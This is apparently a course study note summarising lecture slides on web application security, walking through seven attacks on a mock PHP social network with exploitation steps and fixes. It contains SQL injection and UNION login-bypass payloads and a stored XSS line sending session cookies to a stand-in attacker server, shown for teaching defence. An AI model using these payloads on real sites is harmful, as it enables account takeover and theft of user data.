# Supplementary – Web Application Security

**Source:** CS451 Lecture Slides — Web Application Security (SocialNet Case Study)  
**Course:** [[CS451 - Hub|CS451 – Network Security Fundamentals]]  
**Tags:** #security #web-security #CSRF #XSS #SQLinjection #session-hijacking #CS451

---

## Executive Summary

This supplementary module bridges theory and practice by applying attack techniques to a real (mock) web application — **SocialNet**, a minimal PHP social network. Two teams operate against each other: a **Red Team** that analyzes source code and executes exploits, and a **Blue Team** that receives exploit reports and hardens the application. Seven distinct attack scenarios are mapped to their exact attack vectors, step-by-step exploitation procedures, and mitigations. Together, they form a complete web application threat model covering CSRF, three flavors of SQL injection, Stored XSS, session hijacking, and session fixation.

> **Core Insight**: Every web application vulnerability covered in theory — CSRF, XSS, SQL Injection — has a concrete, repeatable exploitation procedure against a real application. Knowing the *procedure* is what separates a security analyst from a reader.

---

## 1. Security Analysis Workflow for a Software Project

Any software project goes through three phases:

| Phase | Focus |
|---|---|
| **Project Development** | Feature implementation |
| **Project Deployment & Testing** | Feature verification and QA |
| **Project Security Analysis** | Discovering security vulnerabilities *related to application features* |

Security analysis is not a separate concern — it is the third mandatory phase. Skipping it means shipping known-exploitable features.

**Operational model:**
- **Red Team** tries to attack the application.
- **Blue Team** tries to defend it.

This mirrors the real-world penetration testing model from [[Module 2 - Threat Management and Cybersecurity Resources]].

---

## 2. Team Roles

### Red Team

- Receives access to the application **including source code** (white-box testing).
- Performs attack / exploitation and produces a **detailed documentation** for each attack:
  - Attack name/code (e.g., ATT-1)
  - Attack vector specification: steps in detail with preconditions and context
  - Affected components, source code files, version
  - Can use security framework (MITRE ATT&CK) as guidelines
- Members can be community contributors — bounty hunters.

### Blue Team

- **Reactive protection**: receives exploit reports from Red Team and patches the vulnerabilities.
- **Proactive protection**: independently hardens the application before Red Team findings arrive.

---

## 3. The SocialNet Application

SocialNet is a minimal PHP social network used as the attack target. Its features:

- Account Registration
- Login / Logout
- Make Friend
- View profile page (friends only)

The application has an **admin page** for user management and stores user data in a MySQL database. All 7 attacks exploit the gap between its *intended* access control model and its *actual* implementation.

---

## 4. Zero-Loss Extraction: Attack Catalog

### ATT-1: View Profile Page of Unauthorized User

| Property | Detail |
|---|---|
| **Attack Vector** | Cross-Site Request Forgery (CSRF) |
| **Authorization Bypass** | View a friend-only profile page without being a friend |

**Exploitation steps:**
1. Login with a valid account (session user).
2. Identify the target's account (e.g., `userX`).
3. Craft and navigate directly to the profile URL using the known URL pattern:
   - The server generates profile links as predictable URLs containing the target's username/ID.
   - By navigating directly to `http://site/profile?user=userX`, the browser sends the session cookie automatically — the server cannot distinguish this from a legitimate friend request.

**Why CSRF works here:**
CSRF exploits the fact that browsers automatically attach cookies to any request destined for the matching domain, regardless of which page *originated* the request. If the server's authorization check only verifies "is the user logged in?" rather than "is the user authorized for *this specific resource*?", the direct URL navigation bypasses the intended access control.

**Preventions & Mitigations:**
- Server must check: is the session user **eligible** to view the targeted user's profile? (Friend check before serving profile data.)
- **CSRF token**: generate a unique, hashed token per session; embed it in all profile links; validate it on the server before serving the response.
  - Token must be hashed to hide its generation logic (an exposed token generation algorithm allows forgery).
  - Token is generated and validated entirely server-side.

---

### ATT-2: Add New User via Admin Page

| Property | Detail |
|---|---|
| **Attack Vector** | Cross-Site Request Forgery (CSRF) |
| **Authorization Bypass** | Perform admin operations without admin credentials |

**Exploitation steps:**
1. Analyze the admin page to identify the request pattern for user creation (URL, method, parameters).
2. Craft a request matching that pattern and submit it directly from a logged-in browser session.

**Why CSRF works here:**
The admin page performs state-changing operations (creating users) accessible via URL. Without authorization controls on the admin endpoint itself, any authenticated session can submit admin-level requests.

**Prevention:**
- Add **basic authentication** to the admin endpoint (e.g., nginx `auth_basic` directive) to require a separate admin-layer password before the admin page is served at all.
- Restrict admin endpoint access to internal network IPs (IP allowlist).

---

### ATT-3: Change Profile Page of Any User

| Property | Detail |
|---|---|
| **Attack Vector** | SQL Injection — form input exploitation |
| **Data Impact** | Unauthorized modification of any user's profile data |

**Exploitation steps:**
1. Login with a valid account (session user).
2. Identify the victim user account.
3. Open the profile settings page and craft a SQL injection payload in the form fields.
4. The injected SQL modifies the database record for an arbitrary user (not just the session user).

**Why it works:**
The profile update form builds a SQL `UPDATE` query by concatenating unsanitized user input directly into the query string:

```sql
-- Intended query (update session user's record):
UPDATE accounts SET fullname='John' WHERE username='session_user'

-- Injected payload (modifies victim's record):
UPDATE accounts SET fullname='hacked' WHERE username='victim_user'; --
```

**Prevention:**
- **Parameterized queries** (prepared statements): the query structure is compiled before user input is provided; input is treated as data, never as SQL syntax.

---

### ATT-4: List All Usernames in the System

| Property | Detail |
|---|---|
| **Attack Vector** | SQL Injection — query string exploitation, **UNION query attack** |
| **Data Impact** | Full disclosure of the user table |

**Exploitation steps:**
1. Open a profile page that uses an owner parameter in the URL query string (e.g., `profile.php?user_id=1`).
2. Verify the parameter is injectable by testing with a single quote (`'`).
3. Craft a UNION query payload:

```sql
-- Appended to the URL: ?user_id=1 UNION SELECT username,2,3,4 FROM accounts --
```

The UNION query appends a second `SELECT` to the original query, returning all usernames from the `accounts` table alongside the normal result.

**Prevention:**
- **Parameterized query**: makes UNION injection impossible.
- **Input sanitized checking**: reject inputs containing SQL metacharacters (`'`, `--`, `UNION`, etc.).
- **Mod Security**: Web Application Firewall (WAF) that inspects requests and blocks known SQL injection signatures.

---

### ATT-5: Login to Any User Account (Including Non-Existent Users)

| Property | Detail |
|---|---|
| **Attack Vector** | SQL Injection — form input + UNION query |
| **Data Impact** | Full authentication bypass for any account |

**Exploitation steps:**
1. Open the signin page.
2. Generate a bcrypt hash for your chosen password (e.g., `abc123`).
3. In the username field, enter the UNION injection payload:
   ```
   " AND 1=0 UNION SELECT 'user5','your_hash' -- 
   ```
4. Enter the chosen plaintext password in the password field.
5. Press Login.

**Why it works:**
The login query is typically:
```sql
SELECT username, password FROM accounts WHERE username='$input_username'
```

The injected payload makes the original `WHERE` clause return nothing (`AND 1=0`), then injects a fake row `('user5', 'your_hash')` via UNION. The server receives the row, compares the stored hash with the entered password (`password_verify('abc123', 'your_hash')` → TRUE), and logs the attacker in as `user5`.

> This attack can log the attacker in as a user that **does not exist** in the database — the injected row is entirely fabricated.

**Prevention:**
- Parameterized queries.

---

### ATT-6: Hijack a Login Session (Stored XSS + Cookie Theft)

| Property | Detail |
|---|---|
| **Attack Vector** | Stored XSS + Session Hijacking |
| **Data Impact** | Full account takeover for any victim who views the attacker's profile |

**Prerequisites — How cookies and sessions work:**

**Cookies:**
- Server sends a `Set-Cookie` header in the HTTP response → browser stores the cookie keyed by domain (and port).
- Browser automatically sends the cookie in the `Cookie` header of every subsequent request to that domain.

**Sessions (PHPSESSID):**
- Session is a server-side storage space for a browser session.
- Keyed by `sessionID` (`PHPSESSID`), stored at the server.
- `sessionID` is transmitted to the browser as a cookie (`Set-Cookie: PHPSESSID=...`).
- Browser auto-sends `PHPSESSID` on every request → server loads the corresponding session data → client state is restored.

**Exploitation steps:**
1. Write a malicious JavaScript script and embed it in your profile page content (Stored XSS: the script is stored in the database and served to anyone who views the profile):
   ```javascript
   document.location='http://attacker-server/grab?cookie='+document.cookie
   ```
2. Set up a simple data grabber server that reads the `cookie` query parameter and saves it to a file (`$_GET['cookie']` in PHP).
3. Wait for a victim to view your profile page. The victim's browser executes the script and sends their `PHPSESSID` to the attacker's server.
4. Copy the captured `PHPSESSID` cookie from the saved file.
5. Set the copied cookie in your browser (using browser DevTools → Application → Cookies).
6. Reload the target site — you are now authenticated as the victim.

**Why it works:**
The profile page does not sanitize stored content before rendering it. The victim's browser trusts all JavaScript on the page and executes it, including the attacker-injected script. Since `document.cookie` is readable by JavaScript (no `HttpOnly` flag), the session token is extracted.

**Prevention:**
- Sanitize all user-generated content before rendering (HTML-encode `<`, `>`, `"`, `&`).
- Set `HttpOnly` flag on session cookies (prevents JavaScript from reading them via `document.cookie`).
- Set `Secure` flag (cookies only sent over HTTPS).
- Use `SameSite=Strict` to prevent cookie transmission in cross-site requests.

---

### ATT-7: Access a Logged-In Session via Session Fixation

| Property | Detail |
|---|---|
| **Attack Vector** | Stored XSS + Session Fixation |
| **Data Impact** | Account takeover without ever stealing a cookie |

**Exploitation steps:**
1. Write a Stored XSS script in your profile page that **sets** the victim's browser cookie to a specific sessionID controlled by the attacker:
   ```javascript
   document.cookie = 'PHPSESSID=attacker_known_session_id; path=/'
   ```
2. Log out of your own session (so `attacker_known_session_id` is not authenticated yet).
3. Wait for a victim to view your profile page. The XSS script fires and **overwrites** the victim's `PHPSESSID` with the attacker's known session ID. Since you are logged out, the victim is also immediately logged out.
4. The victim, confused, logs in again — **using the attacker's session ID** (which is now set in their browser).
5. The server authenticates the login and marks `attacker_known_session_id` as an authenticated session for the victim.
6. The attacker (who knows `attacker_known_session_id`) loads the page and is now logged in as the victim.

**Key distinction from ATT-6:**
- ATT-6 **steals** the victim's existing session ID.
- ATT-7 **fixes** the victim's session ID to one the attacker chose in advance — no stealing needed.

**Prevention:**
- On successful login, always **regenerate the session ID** (`session_regenerate_id(true)` in PHP). This makes any pre-set sessionID invalid after authentication.
- HttpOnly cookie flag prevents the XSS from overwriting via JavaScript.

---

## 5. Deep Dive: The Attack Vector Taxonomy

All 7 attacks map to three root vulnerability classes:

| Root Vulnerability | Attacks | Why It Occurs |
|---|---|---|
| **Broken Access Control** | ATT-1, ATT-2 | Server authorizes based on "is logged in" rather than "is authorized for this resource" |
| **SQL Injection** | ATT-3, ATT-4, ATT-5 | User input is concatenated directly into SQL query strings without parameterization |
| **Cross-Site Scripting (Stored)** | ATT-6, ATT-7 | User-generated content is rendered by other users' browsers without sanitization |

### Why Parameterized Queries Defeat All Three SQL Attacks

A **parameterized query** (also called a prepared statement) separates the SQL *structure* from the *data*:

```php
// Vulnerable: string concatenation
$query = "SELECT * FROM accounts WHERE username='" . $username . "'";

// Safe: parameterized
$stmt = $pdo->prepare("SELECT * FROM accounts WHERE username=?");
$stmt->execute([$username]);
```

In the safe version, the database driver compiles the query structure first. When `$username` is provided, it is treated purely as a value — SQL metacharacters inside it (`'`, `--`, `UNION`) are **never interpreted as SQL syntax**. UNION injection, form injection, and query string injection are all neutralized by this single change.

### Session Security Layers

| Defense | Defeats |
|---|---|
| `HttpOnly` cookie flag | ATT-6 (cookie theft via `document.cookie`) |
| `session_regenerate_id()` on login | ATT-7 (session fixation) |
| Output sanitization (HTML encoding) | Both ATT-6 and ATT-7 (removes the XSS vector entirely) |
| CSRF token on state-changing URLs | ATT-1, ATT-2 |

> Defense-in-depth is essential: sanitizing output **and** setting HttpOnly **and** regenerating sessions provides overlapping coverage so that no single missed control creates a full compromise.

---

## Key Takeaways & Next Steps

1. **CSRF exploits the browser's automatic cookie attachment** — the server must validate authorization, not just authentication.
2. **SQL injection is defeated entirely by parameterized queries** — there is no valid reason not to use them in new code.
3. **UNION injection can fabricate rows** — an attacker does not need a real account to authenticate.
4. **Stored XSS is a force multiplier** — one injected script runs in every victim's browser, indefinitely.
5. **Session fixation is more dangerous than session hijacking** — the attacker controls the session ID before authentication, requiring no interception.
6. **Session regeneration on login is non-negotiable** — it is a one-line fix that defeats session fixation entirely.
7. **The OWASP Top 10 is not abstract** — ATT-1/2 = Broken Access Control (#1), ATT-3/4/5 = SQL Injection (#3), ATT-6/7 = XSS (#3 historically, now Injection family).

---

## Graph View Links

**Previous**: [[Supplementary - Web Application Development]]  
**Next**: —  
**Hub**: [[CS451 - Hub]]
